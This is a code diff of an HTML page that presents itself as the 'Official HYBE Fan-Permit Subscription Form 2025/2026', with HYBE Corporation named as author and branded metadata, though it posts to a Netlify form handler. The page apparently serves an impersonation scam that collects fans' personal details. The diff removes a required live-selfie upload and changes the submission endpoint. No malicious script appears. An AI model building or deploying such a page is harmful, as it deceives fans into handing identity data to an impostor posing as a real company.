@@ -3,26 +3,22 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-
   <title>Official HYBE Fan-Permit Subscription Form 2025/2026</title>
   <meta name="description" content="Join the HYBE Fan-Permit 2025/2026 for exclusive K-pop access, artist content, events, and limited-edition merchandise. Secure your spot today!" />
   <meta name="keywords" content="HYBE, K-pop, fan subscription, fan permit, HYBE artists, HYBE membership, K-pop merchandise" />
   <meta name="author" content="HYBE Corporation" />
-
   <!-- Open Graph / Facebook -->
   <meta property="og:type" content="website" />
   <meta property="og:url" content="hybecorp.com" />
   <meta property="og:title" content="Official HYBE Fan-Permit 2025/2026 Subscription" />
   <meta property="og:description" content="Get exclusive access to HYBE artist events, behind-the-scenes content, and official merchandise." />
   <meta property="og:image" content="https://logotyp.us/file/hybe.svg" />
-
   <!-- Twitter -->
   <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:url" content="hybecorp.com" />
   <meta name="twitter:title" content="Join HYBE Fan-Permit 2025/2026" />
   <meta name="twitter:description" content="Be first in line for artist events, fan meetings, and official HYBE gear." />
   <meta name="twitter:image" content="https://logotyp.us/file/hybe.svg" />
-
   <!-- Bootstrap 5 CSS -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
   <!-- AOS CSS -->
@@ -37,7 +33,6 @@
   <link rel="stylesheet" href="styles.css" />
   <script type="module" src="script.js"></script>
 </head>
-
 <body>
   <!-- No JavaScript Fallback -->
   <noscript>
@@ -67,8 +62,8 @@
           <div class="card shadow-lg" data-aos="zoom-in">
             <div class="card-body">
               <!-- Progress Bar -->
-              <div class="progress mb-4" role="progressbar" aria-label="Form progress" aria-valuenow="33" aria-valuemin="0" aria-valuemax="100">
-                <div class="progress-bar bg-gradient" style="width: 33%"></div>
+              <div class="progress mb-4" role="progressbar" aria-label="Form progress" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100">
+                <div class="progress-bar bg-gradient" style="width: 0%"></div>
               </div>
 
               <div class="text-center mb-4">
@@ -79,9 +74,7 @@
               <h2 class="text-center text-muted mb-3">Join the Ultimate Fan Community</h2>
               <p class="text-center description mb-4">Subscribe for exclusive access to HYBE artist updates, events, and merchandise.</p>
 
-              <form id="subscription-form" action="/.netlify/functions/submit-form" method="POST" enctype="multipart/form-data">
-                <input type="hidden" name="form-name" value="hybe-fan-permit" />
-                <input type="hidden" name="subject" value="HYBE Fan-Permit Submission" />
+              <form id="subscription-form" name="subscription-form" data-netlify="true" method="POST" action="/success">
                 <input type="hidden" name="country" id="country">
                 <input type="hidden" name="currency" id="currency">
                 <input type="hidden" name="language" id="language">
@@ -233,13 +226,7 @@
                   </div>
                 </div>
 
-                <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="600">
-                  <label for="selfie" class="form-label">Upload a Clear Live Selfie <span class="text-danger">*</span></label>
-                  <input class="form-control" type="file" id="selfie" name="selfie" accept="image/*" required />
-                  <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Upload a clear, recent selfie"></i>
-                </div>
-
-                <div class="mb-3" data-aos="fade-up" data-aos-delay="650">
+                <div class="mb-3" data-aos="fade-up" data-aos-delay="600">
                   <label class="form-label">Preferred Contact Method <span class="text-danger">*</span></label>
                   <div class="form-check">
                     <input class="form-check-input" type="checkbox" name="contact-method" id="email-contact" value="Via Email" required />
@@ -252,7 +239,7 @@
                 </div>
 
                 <!-- Feedback Box -->
-                <div class="mb-3" data-aos="fade-up" data-aos-delay="675">
+                <div class="mb-3" data-aos="fade-up" data-aos-delay="650">
                   <label for="feedback" class="form-label">Feedback (Optional)</label>
                   <textarea class="form-control" id="feedback" name="feedback" placeholder="Share your thoughts about the Fan-Permit"></textarea>
                 </div>
@@ -268,7 +255,7 @@
                   </div>
                   <div class="form-check">
                     <input class="form-check-input" type="checkbox" id="subscription-agreement" name="subscription-agreement" required />
-                    <label class="form-check-label" for="subscription-agreement">Agree and complete subscription.</label>
+                    <label class="form-check-label" for="subscription-agreement"> Agree and complete subscription.</label>
                   </div>
                 </div>
 
